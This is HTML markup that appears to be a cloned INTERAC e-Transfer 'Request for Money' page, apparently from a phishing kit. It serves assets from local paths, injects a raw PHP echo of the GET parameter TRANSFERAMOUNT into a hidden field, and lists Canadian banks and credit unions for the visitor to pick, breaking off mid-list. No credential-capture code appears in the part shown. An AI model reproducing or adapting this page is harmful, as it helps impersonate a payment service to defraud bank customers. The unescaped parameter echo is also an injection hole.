<p>
	INTERAC e-Transfer
</p>
<div id="menu" class="custom-wrapper nav-menu" data-enhance="false">
	<div class="pure-g nav-wrapper interac-max-width">
		<div class="pure-u-1 pure-u-md-1-3">
			<div class="pure-menu pure-menu-heading">
				<a class="custom-brand">
					<img id="brand-logo" style="height: 50px; width: auto !important;" src="./files/svg/etransfer_logo.svg" alt="INTERAC e-Transfer " />
				</a>
				<a class="change-language pure-menu-link pure-hidden-md pure-hidden-lg pure-hidden-xl" style="position: absolute; top: 15px; right: 90px;" data-ajax="false">
					 Fran&ccedil;ais
				</a>
				<a class="help-link pure-menu-link pure-hidden-md pure-hidden-lg pure-hidden-xl help-link" style="position: absolute; top: 5px; right: 45px;" data-ajax="false">
					<img id="help-icon" src="./files/svg/question-mark.svg" alt="?" width="30px" height="30px" />
				</a>
			</div>
		</div>
		<div class="pure-u-1 pure-u-md-2-3">
			<div class="pure-menu pure-menu-horizontal custom-menu-3 custom-can-transform">
				<ul class="pure-menu-list">
					<li class="pure-menu-item">
						<a class="contactus-link pure-menu-link" data-ajax="false">
							Contact Us
						</a>
					</li>
					<li class="pure-menu-item">
						<a class="about-menu pure-menu-link" data-ajax="false">
							About
						</a>
					</li>
					<li class="pure-menu-item pure-hidden-sm pure-hidden-xs">
						<a class="change-language pure-menu-link" data-ajax="false">
							 Fran&ccedil;ais
						</a>
					</li>
					<li class="pure-menu-item pure-hidden-sm pure-hidden-xs">
						<a class="help-link pure-menu-link" data-ajax="false">
							<img id="help-icon" src="./files/svg/question-mark.svg" alt="?" width="30px" height="30px" />
						</a>
					</li>
				</ul>
			</div>
		</div>
	</div>
</div>
<div class="interac-max-width ui-page ui-page-theme-a ui-page-active" style="position: relative;" tabindex="0" data-role="page" data-enhance="false" data-url="/RP.do?pID=CAAFM9f5">
	<div class="details-panel margin-top-15">
		<div class="pure-u-1">
			<div class="pure">
				<div class="pure-g">
					<div class="pure-u-1 pure-u-sm-1-2 left-hand-info">
						<div class="pure-u-21-24">
							<div>
								<h1 class="deposit-label" style="margin-top: 0px;">
									Request for Money
								</h1>
							</div>
							<div class="margin-bottom-15 line">
								<span id="amountValue" class="largeFont">
									$
								</span>
								<span id="currencyValue" class="paymentDetailsImportantFont">
									CAD
								</span>
								<input id="fmtAmount" name="fmtAmount" type="hidden" value="&lt;?php echo $_GET['TRANSFERAMOUNT'];?&gt;" />
							</div>
							<div class="pure-u-1 paymentDetailsImportantFont line fromDiv">
								<div class="grid-style">
									<span id="fromLabel">
										 From :
									</span>
								</div>
							</div>
						</div>
					</div>
					<div class="pure-hidden-xs pure-hidden-sm pure-u-sm-1-2 desktop-only-left-grey-border right-hand-info">
						<div class="pure-u-1 right-hand-container">
							<div class="left-hand-line">
								<div class="pure-u-xl-5-24 pure-u-md-6-24 pure-u-sm-7-24 right-hand-label">
									<span id="expiryLabel">
										Expires:
									</span>
								</div>
							</div>
							<div class="left-hand-line">
								<div class="pure-u-xl-5-24 pure-u-md-6-24 pure-u-sm-7-24 right-hand-label">
									<span id="referenceNumLabel">
										Notice:
									</span>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="pure-u-1 pure-hidden-xl pure-hidden-lg pure-hidden-md mobile-details-panel">
		<div class="accordion">
			<div class="pure-g accordion-toggle">
				<div class="pure-u-4-5">
					<h4 class="global-left-padding">
						View Transfer Details
					</h4>
				</div>
			</div>
			<div class="accordion-content global-left-padding">
				<div class="pure-u-1">
					<div class="left-hand-line">
						<div class="pure-u-1-2 right-hand-label" style="width: 35%;">
							<span id="expiryLabel">
								Expires:
							</span>
						</div>
					</div>
					<div class="left-hand-line">
						<div class="pure-u-1-2 right-hand-label" style="width: 35%;">
							<span id="referenceNumLabel">
								Notice:
							</span>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div id="search-toggle-header">
		<input id="fiListOption" name="fiListOption" type="hidden" value="null" />
		<div class="pure-u-1">
			<div class="pure">
				<div class="pure-g">
					<div class="pure-u-1 pure-u-sm-1-2">
						<div id="select-fi-title" class="title-on">
							<h2 class="resp-header-size global-left-padding">
								Select Your Financial Institution
							</h2>
						</div>
						<div id="search-title" class="title-off">
							<h2 class="resp-header-size global-left-padding">
								Search
							</h2>
						</div>
					</div>
					<div class="pure-u-1 pure-u-sm-1-2" style="text-align: right;">
						<div id="search-pos" class="column">
							<div id="search-container" class="">
								<div id="search-wrapper" class="">
									<div id="autocomplete-typehead-div">
										<span class="twitter-typeahead" style="position: relative; display: inline-block;">
											<span class="twitter-typeahead" style="position: relative; display: inline-block;">
												<span class="twitter-typeahead" style="position: relative; display: inline-block;">
													<input id="autocomplete-input" class="typehead tt-input visibility-hidden" dir="auto" style="position: relative; vertical-align: top;" spellcheck="false" autocomplete="off" type="text" placeholder="Bank or Credit Union Name" />
												</span>
											</span>
										</span>
									</div>
									<div id="search-retracted-label" class="">
										Search
									</div>
									<div class="sb-icon-search">
										<img id="close-icon" class="" style="visibility: hidden;" src="./files/svg/close-icon.svg" alt="Close search form" width="40px" height="40px" />
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div id="fiSelection" style="overflow-y: hidden;">
		<div id="fiOptionsPane" style="overflow-y: hidden;">
			<div class="pure-g" style="overflow-y: hidden;">
				<div class="pure-u-1" style="overflow-y: hidden;">
					<div class="fi-grid" style="overflow-y: hidden;">
						<div class="pure-g" style="overflow-y: hidden;">
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000001" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/atb.svg" alt="ATB" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000001" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/bmo.svg" alt="BMO Bank of Montreal" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000002" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/cibcnew.svg" alt="CIBC" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000815" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/desj.svg" alt="Desjardins" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000815" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/hsbc.svg" alt="HSBC" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000809_038860000" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/laur.svg" alt="Laurentian Bank of Canada" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000540" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/manu.svg" alt="Manulife Bank of Canada" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000540" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/meridian.svg" alt="Meridian Credit Union" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000540" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/motus.svg" alt="MOTUS BANK" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000006" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/nbc.svg" alt="National Bank of Canada" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000006" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/pc.svg" alt="PC Financial" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000003" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/rbc.svg" alt="RBC Royal Bank" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000002" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/sco.svg" alt="Scotiabank" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000002" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" style="max-width: 120px;" src="./files/svg/simplii.svg" alt="Scotiabank" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000614" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/tang.svg" alt="Tangerine Bank" />
								</div>
							</div>
							<div class="white-background pure-g inherit-height vertical-middle fi-option">
								<div id="fi-logo-CA000004" class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper">
									<img class="fi-logo-image" src="./files/svg/td.svg" alt="TD Canada Trust" />
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="separator margin-bottom-30 padding-h-10" style="margin-right: 10px; transform: translate(0px, -2px); margin-left: 10px;">
			<div>
				OR
			</div>
		</div>
		<div class="pure-u-1">
			<form class="pure-form pure-form-stacked fi-dropdown-container-delete">
				<div class="pure-g">
					<div class="pure-u-1 pure-u-sm-1-2">
						<div class="pure-g padding-top-25 margin-desktop-only-left-25">
							<div class="pure-u-1">
								<label for="selectFiId">
									Select Your Financial Institution
								</label>
							</div>
							<div class="pure-u-11-12 selectFi">
								<select id="selectFiId" name="selectFiId" data-role="none" data-mini="true">
									<option selected="selected" value="">
										Select institution
									</option>
									<option value="CA000809">
										Alterna Bank
									</option>
									<option value="CA000219">
										ATB Financial
									</option>
									<option value="CA000001">
										BMO Bank of Montreal
									</option>
									<option value="CA000809">
										Canadian Direct Financial
									</option>
									<option value="CA000809">
										Canadian Western Bank
									</option>
									<option value="CA000010">
										CIBC
									</option>
									<option value="CA000809">
										CTC Bank of Canada
									</option>
									<option value="CA000352">
										DCBank
									</option>
									<option value="CA000815">
										Desjardins
									</option>
									<option value="CA000809">
										EQ Bank
									</option>
									<option value="CA000809">
										First Nations Bank of Canada
									</option>
									<option value="CA000016">
										HSBC Bank Canada
									</option>
									<option value="CA000809">
										Laurentian Bank of Canada
									</option>
									<option value="CA000540">
										Manulife Bank of Canada
									</option>
									<option value="CA000006">
										National Bank of Canada
									</option>
									<option value="CA000006">
										National Bank-Partnership
									</option>
									<option value="CA000809">
										Peace Hills Trust
									</option>
									<option value="CA000010">
										President's Choice Financial
									</option>
									<option value="CA000003">
										RBC Royal Bank
									</option>
									<option value="CA000002">
										Scotiabank
									</option>
									<option value="CA000006">
										Solutions Banking-Freedom 55
									</option>
									<option value="CA000006">
										Solutions Banking-Great West
									</option>
									<option value="CA000006">
										Solutions Banking-Investors Group
									</option>
									<option value="CA000614">
										Tangerine Bank
									</option>
									<option value="CA000004">
										TD Canada Trust
									</option>
									<option value="CA000809">
										Wealth One Bank of Canada
									</option>
								</select>
								<span class="hint-label">
									Select a Financial Institution from the list above
								</span>
							</div>
						</div>
					</div>
					<div class="pure-u-1 pure-u-sm-1-2 desktop-only-left-grey-border">
						<div class="pure-g padding-top-25 margin-desktop-only-left-25">
							<div class="pure-u-11-12">
								<label for="province">
									Select Province or Territory
								</label>
								<select id="province" class="fi-select" name="province" data-role="none">
									<option selected="selected" value="">
										Select Province or Territory
									</option>
									<option value="AB">
										Alberta
									</option>
									<option value="BC">
										British Columbia
									</option>
									<option value="MB">
										Manitoba
									</option>
									<option value="NB">
										New Brunswick
									</option>
									<option value="NL">
										Newfoundland and Labrador
									</option>
									<option value="NT">
										Northwest Territories
									</option>
									<option value="NS">
										Nova Scotia
									</option>
									<option value="NU">
										Nunavut
									</option>
									<option value="ON">
										Ontario
									</option>
									<option value="PE">
										Prince Edward Island
									</option>
									<option value="QC">
										Quebec
									</option>
									<option value="SK">
										Saskatchewan
									</option>
									<option value="YT">
										Yukon Territory
									</option>
								</select>
								<span class="hint-label">
									Select a Province from the list above
								</span>
							</div>
						</div>
						<div class="pure-g padding-top-25 margin-desktop-only-left-25">
							<div class="pure-u-11-12">
								<div id="placeholderCU" class="selectCu">
									<label for="placeholderDropdown">
										Select Credit Union
									</label>
									<select id="placeholderDropdown" disabled="disabled" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select a Province Above
										</option>
									</select>
									<span class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-AB" for="selectCu-AB">
										Select Credit Union
									</label>
									<select id="selectCu-AB" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="046610163">
											1st Choice Savings and Credit Union
										</option>
										<option value="629442001">
											ABSCC
										</option>
										<option value="046610332">
											Beaumont Credit Union Ltd
										</option>
										<option value="046610021">
											Bow Valley Credit Union
										</option>
										<option value="046610282">
											Chinook Financial
										</option>
										<option value="046610215">
											Christian Credit Union
										</option>
										<option value="046610278">
											Encompass Credit Union
										</option>
										<option value="046610100">
											First Calgary Financial
										</option>
										<option value="046610379">
											Lakeland Credit Union
										</option>
										<option value="046610243">
											Legacy Savings &amp; Credit Union Ltd.
										</option>
										<option value="046612311">
											Mountain View Credit Union
										</option>
										<option value="046610031">
											Pincher Creek Credit Union
										</option>
										<option value="046610242">
											River City Credit Union Ltd.
										</option>
										<option value="046610305">
											Rocky Credit Union
										</option>
										<option value="294420010">
											Servus Credit Union
										</option>
										<option value="046610130">
											Shell Employees' Credit Union Limited
										</option>
										<option value="046612298">
											Vermilion Credit Union
										</option>
										<option value="046610254">
											Vision Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-AB" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-BC" for="selectCu-BC">
										Select Credit Union
									</label>
									<select id="selectCu-BC" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="818092900">
											Aldergrove Credit Union
										</option>
										<option value="818090530">
											BlueShore Financial
										</option>
										<option value="818090500">
											Bulkley Valley Credit Union
										</option>
										<option value="833604370">
											CCEC Credit Union
										</option>
										<option value="818094692">
											Coast Capital Savings
										</option>
										<option value="818091529">
											Coastal Community Credit Union
										</option>
										<option value="818093300">
											Columbia Valley Credit Union
										</option>
										<option value="819770002">
											Community Savings BC
										</option>
										<option value="833602940">
											Compensation Employees Credit Union
										</option>
										<option value="818092340">
											Creston and District CU (BC)
										</option>
										<option value="818092230">
											East Kootenay Community Credit Union
										</option>
										<option value="818091730">
											Enderby &amp; District Financial
										</option>
										<option value="818094560">
											Envision Financial
										</option>
										<option value="818090010">
											First Credit Union
										</option>
										<option value="818091190">
											G&amp;F Financial Group
										</option>
										<option value="818092050">
											Grand Forks District Savings Credit Union
										</option>
										<option value="818090210">
											Greater Vancouver Community Credit Union
										</option>
										<option value="818091900">
											Heritage Credit Union (BC)
										</option>
										<option value="818094750">
											Integris Credit Union
										</option>
										<option value="833600040">
											Interior Savings BC
										</option>
										<option value="816280002">
											Island Savings
										</option>
										<option value="818094640">
											Khalsa Credit Union
										</option>
										<option value="317442300">
											Kootenay Savings Credit Union
										</option>
										<option value="818091160">
											Ladysmith &amp; District Credit Union
										</option>
										<option value="818091010">
											Lake View Credit Union
										</option>
										<option value="818090840">
											Mt. Lehman Credit Union
										</option>
										<option value="818092200">
											Nelson and District Credit Union
										</option>
										<option value="818091670">
											North Peace Savings &amp; Credit Union
										</option>
										<option value="818091390">
											Northern Savings Credit Union
										</option>
										<option value="818091510">
											Osoyoos Credit Union
										</option>
										<option value="271350000">
											Prospera Credit Union
										</option>
										<option value="818092750">
											Revelstoke Credit Union
										</option>
										<option value="833601570">
											SASCU Credit Union
										</option>
										<option value="818092240">
											Spruce Credit Union
										</option>
										<option value="818091270">
											Summerland &amp; District Credit Union
										</option>
										<option value="818090660">
											Sunshine Coast Credit Union
										</option>
										<option value="833601140">
											Union Bay Credit Union
										</option>
										<option value="818091660">
											Valley First
										</option>
										<option value="813530002">
											Vancity
										</option>
										<option value="833601260">
											VantageOne Credit Union(BC)
										</option>
										<option value="816260000">
											Westminster Savings Credit Union
										</option>
										<option value="818092500">
											Williams Lake and District Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-BC" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-MB" for="selectCu-MB">
										Select Credit Union
									</label>
									<select id="selectCu-MB" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="821630070">
											Access Credit Union Limited
										</option>
										<option value="821630010">
											Assiniboine Credit Union
										</option>
										<option value="821630660">
											Austin - Stride Credit Union
										</option>
										<option value="821630520">
											Beautiful Plains Credit Union
										</option>
										<option value="818790087">
											Belgian-Alliance Credit Union Ltd
										</option>
										<option value="821630080">
											Cambrian Credit Union Limited
										</option>
										<option value="818790018">
											Carpathia Credit Union Limited
										</option>
										<option value="821630690">
											Casera Credit Union
										</option>
										<option value="821630090">
											Catalyst Credit Union
										</option>
										<option value="821630900">
											Crocus Credit Union
										</option>
										<option value="818790019">
											Crosstown Civic Credit Union
										</option>
										<option value="821630280">
											Entegra Credit Union
										</option>
										<option value="821630930">
											Erickson Credit Union
										</option>
										<option value="821631240">
											Flin Flon Credit Union
										</option>
										<option value="821630230">
											Grandview Credit Union
										</option>
										<option value="821631890">
											Implicity Financial
										</option>
										<option value="818796292">
											MaxaFinancial Credit Union
										</option>
										<option value="821630050">
											Me-Dian Credit Union
										</option>
										<option value="818790031">
											Minnedosa Credit Union
										</option>
										<option value="821630100">
											Niverville Credit Union
										</option>
										<option value="818799429">
											Noventis Credit Union
										</option>
										<option value="821630330">
											Oak Bank Credit Union
										</option>
										<option value="821631840">
											Outlook Financial
										</option>
										<option value="821630020">
											Portage - Stride Credit Union
										</option>
										<option value="821630400">
											Rosenort Credit Union Limited
										</option>
										<option value="821630470">
											Steinbach Credit Union
										</option>
										<option value="821631060">
											Strathclair Credit Union
										</option>
										<option value="294470780">
											Sunova Credit Union
										</option>
										<option value="821630490">
											Sunrise Credit Union
										</option>
										<option value="821630030">
											Swan Valley Credit Union
										</option>
										<option value="821630410">
											Vanguard Credit Union
										</option>
										<option value="821630160">
											Westoba Credit Union
										</option>
										<option value="818790079">
											Winnipeg Police Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-MB" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-NB" for="selectCu-NB">
										Select Credit Union
									</label>
									<select id="selectCu-NB" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="888900702">
											Advance Savings Credit Union Limited
										</option>
										<option value="818496700">
											Bayview Credit Union
										</option>
										<option value="888900709">
											Beaubear Credit Union Limited
										</option>
										<option value="888900713">
											Blackville Credit Union
										</option>
										<option value="888900711">
											New Brunswick Teachers Association Credit Union Ltd.
										</option>
										<option value="888900701">
											OMISTA Credit Union
										</option>
										<option value="888900712">
											Progressive Credit Union Limited
										</option>
										<option value="000000865">
											UNI Financial Cooperation
										</option>
									</select>
									<span id="selectCu-hintlabel-NB" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-NL" for="selectCu-NL">
										Select Credit Union
									</label>
									<select id="selectCu-NL" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="888900801">
											Community Credit Union Ltd
										</option>
										<option value="888900813">
											Eagle River Credit Union
										</option>
										<option value="888900820">
											EasternEdge Credit Union Ltd.
										</option>
										<option value="888900817">
											Hamilton Sound Credit Union
										</option>
										<option value="888900816">
											Leading Edge Credit Union
										</option>
										<option value="888900802">
											Newfoundland and Labrador Credit Union
										</option>
										<option value="888900814">
											Public Service Credit Union Ltd.
										</option>
										<option value="888900821">
											Reddy Kilowatt Credit Union
										</option>
										<option value="888900828">
											Venture Credit Union Limited
										</option>
									</select>
									<span id="selectCu-hintlabel-NL" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-NT" for="selectCu-NT">
										Select Credit Union
									</label>
									<select id="selectCu-NT" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-NT" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-NS" for="selectCu-NS">
										Select Credit Union
									</label>
									<select id="selectCu-NS" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="888900047">
											Acadian Credit Union Limited
										</option>
										<option value="888900229">
											Caisse populaire de Clare
										</option>
										<option value="888900010">
											Coady Credit Union
										</option>
										<option value="888900193">
											Coastal Financial Credit Union
										</option>
										<option value="888900335">
											Community Credit Union of Cumberland Colchester
										</option>
										<option value="888900337">
											CUA
										</option>
										<option value="888900350">
											Decommisioned
										</option>
										<option value="888900027">
											DOMINION CREDIT UNION
										</option>
										<option value="888900057">
											East Coast Credit Union
										</option>
										<option value="888900354">
											Glace Bay Central Credit Union Ltd
										</option>
										<option value="888900049">
											iNova Credit Union Limited
										</option>
										<option value="888900279">
											LaHave River CU
										</option>
										<option value="888900290">
											New Ross Credit Union
										</option>
										<option value="888900019">
											New Waterford Credit Union
										</option>
										<option value="888900106">
											North Sydney Credit Union
										</option>
										<option value="888900359">
											Princess Credit Union
										</option>
										<option value="888900083">
											Provincial Government Employees Credit Union
										</option>
										<option value="888900052">
											St. Joseph's CU
										</option>
										<option value="888900016">
											Steel Centre Credit Union
										</option>
										<option value="888900349">
											Sydney Credit Union Limited
										</option>
										<option value="888900288">
											Teachers Plus Credit Union
										</option>
										<option value="888900263">
											Valley Credit Union Limited
										</option>
										<option value="888900333">
											Victory Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-NS" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-NU" for="selectCu-NU">
										Select Credit Union
									</label>
									<select id="selectCu-NU" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-NU" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-ON" for="selectCu-ON">
										Select Credit Union
									</label>
									<select id="selectCu-ON" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="818280460">
											Airline Financial Credit Union
										</option>
										<option value="888330005">
											Alterna Savings
										</option>
										<option value="818280171">
											Auto Workers Community Credit Union
										</option>
										<option value="818280618">
											Bay Credit Union
										</option>
										<option value="818280739">
											Bayshore Credit Union Ltd.
										</option>
										<option value="818280675">
											Buduchnist Credit Union Ltd
										</option>
										<option value="818280519">
											City Savings &amp; Credit Union
										</option>
										<option value="818280383">
											Community First, A division of Your Neighbourhood Credit Union
										</option>
										<option value="818280033">
											Comtech Credit Union
										</option>
										<option value="818281018">
											Copperfin Credit Union
										</option>
										<option value="818282191">
											Creative Arts Savings &amp; Credit Union
										</option>
										<option value="818280633">
											decommsgn
										</option>
										<option value="897810013">
											DUCA
										</option>
										<option value="818282035">
											Education Credit Union
										</option>
										<option value="818280145">
											Equity Credit Union
										</option>
										<option value="818280946">
											Estonian Credit Union
										</option>
										<option value="818281463">
											Finnish Credit Union
										</option>
										<option value="818280083">
											Fire Services Credit Union
										</option>
										<option value="818286292">
											FirstOntario Credit Union Limited
										</option>
										<option value="818280384">
											Frontline Financial Credit Union
										</option>
										<option value="818280244">
											Ganaraska Financial Credit Union
										</option>
										<option value="818280430">
											Health Care Credit Union
										</option>
										<option value="818280041">
											HMECU/Healthcare and Municipal Employees Credit Union
										</option>
										<option value="818282145">
											IC Savings
										</option>
										<option value="818280632">
											Kawartha Credit Union
										</option>
										<option value="818281794">
											Kindred Credit Union
										</option>
										<option value="818281444">
											Kingston Community
										</option>
										<option value="000000890">
											L'Alliance des caisses populaires de l'Ontario limit&eacute;e
										</option>
										<option value="892500000">
											Lambton Financial Credit Union
										</option>
										<option value="818286282">
											Libro Credit Union
										</option>
										<option value="818280368">
											Limestone Credit Union
										</option>
										<option value="818280622">
											Luminus Financial
										</option>
										<option value="818281383">
											Mainstreet Credit Union
										</option>
										<option value="294410400">
											Member Savings Credit Union Limited
										</option>
										<option value="818281080">
											MemberOne Credit Union Ltd.
										</option>
										<option value="818280220">
											Meridian Credit Union
										</option>
										<option value="818281039">
											MOMENTUMON
										</option>
										<option value="818282126">
											Motor City Community Credit Union Limited
										</option>
										<option value="891433200">
											Moya Financial
										</option>
										<option value="818281449">
											Northern Credit Union Limited (Ontario)
										</option>
										<option value="818280313">
											Northern Lights Credit Union
										</option>
										<option value="818281696">
											Ontario Educational Credit Union
										</option>
										<option value="818282027">
											OPPA Credit Union
										</option>
										<option value="818280630">
											Oshawa Community Credit Union
										</option>
										<option value="818281253">
											Ottawa Police Credit Union
										</option>
										<option value="818286444">
											PACE Savings &amp; Credit Union Limited
										</option>
										<option value="818280780">
											Parama Credit Union
										</option>
										<option value="818280603">
											PenFinancial Credit Union
										</option>
										<option value="818280063">
											Peterborough Community Credit Union
										</option>
										<option value="818281140">
											Quinte First Credit Union
										</option>
										<option value="846000120">
											Rapport
										</option>
										<option value="021170000">
											Resurrection Credit Union Limited
										</option>
										<option value="818282120">
											Southwest Regional Credit Union
										</option>
										<option value="011900000">
											St. Stanislaus - St. Casimir's Polish Parishes Credit Union
										</option>
										<option value="818280602">
											Sudbury Credit Union Limited
										</option>
										<option value="818281189">
											TALKA CREDIT UNION LIMITED
										</option>
										<option value="818280052">
											Tandia Financial Credit Union
										</option>
										<option value="818280067">
											THE ENERGY CREDIT UNION LIMITED
										</option>
										<option value="818280289">
											The Police Credit Union Limited
										</option>
										<option value="818280376">
											Thorold Community Credit Union Limited
										</option>
										<option value="818280055">
											Toronto Municipal Employees' Credit Union
										</option>
										<option value="818280197">
											Ukrainian Credit Union Limited
										</option>
										<option value="818282118">
											Windsor Family Credit Union Limited
										</option>
										<option value="818281710">
											Your Credit Union
										</option>
										<option value="818280340">
											Your Neighbourhood Credit Union Limited
										</option>
									</select>
									<span id="selectCu-hintlabel-ON" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-PE" for="selectCu-PE">
										Select Credit Union
									</label>
									<select id="selectCu-PE" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="888900904">
											Consolidated Credit Union
										</option>
										<option value="888900902">
											Malpeque Bay Credit Union Ltd.
										</option>
										<option value="888900908">
											Morell Credit Union
										</option>
										<option value="888900907">
											Provincial Credit Union
										</option>
										<option value="888900909">
											Souris Credit Union Ltd
										</option>
										<option value="888900911">
											Tignish Credit Union Ltd.
										</option>
										<option value="888900905">
											&Eacute;vang&eacute;line-Central Credit Union Ltd
										</option>
									</select>
									<span id="selectCu-hintlabel-PE" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-QC" for="selectCu-QC">
										Select Credit Union
									</label>
									<select id="selectCu-QC" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-QC" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-SK" for="selectCu-SK">
										Select Credit Union
									</label>
									<select id="selectCu-SK" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
										<option value="818894540">
											Accent Credit Union
										</option>
										<option value="378601000">
											Affinity Credit Union
										</option>
										<option value="818890890">
											Bengough Credit Union
										</option>
										<option value="818891500">
											Biggar &amp; District Credit Union
										</option>
										<option value="818891440">
											Bruno Savings and Credit Union Limited
										</option>
										<option value="818890960">
											Churchbridge Credit Union
										</option>
										<option value="818890010">
											Conexus Credit Union
										</option>
										<option value="818890450">
											Cornerstone Credit Union
										</option>
										<option value="818891850">
											Crossroads Credit Union
										</option>
										<option value="818891200">
											Cypress Credit Union
										</option>
										<option value="818891730">
											Debden Credit Union
										</option>
										<option value="818892550">
											Diamond North Credit Union
										</option>
										<option value="818891940">
											Dodsland Credit Union
										</option>
										<option value="818891970">
											Earl Grey Credit Union Limited
										</option>
										<option value="818891990">
											Edam Credit Union
										</option>
										<option value="818892130">
											Foam Lake Credit Union
										</option>
										<option value="818892190">
											Goodsoil Credit Union
										</option>
										<option value="818891800">
											Horizon Credit Union
										</option>
										<option value="818891350">
											Innovation Credit Union
										</option>
										<option value="818892620">
											Kerrobert Credit Union
										</option>
										<option value="818892010">
											Lafleche Credit Union
										</option>
										<option value="818892690">
											Landis Credit Union Limited
										</option>
										<option value="818892500">
											LeRoy Credit Union
										</option>
										<option value="818892840">
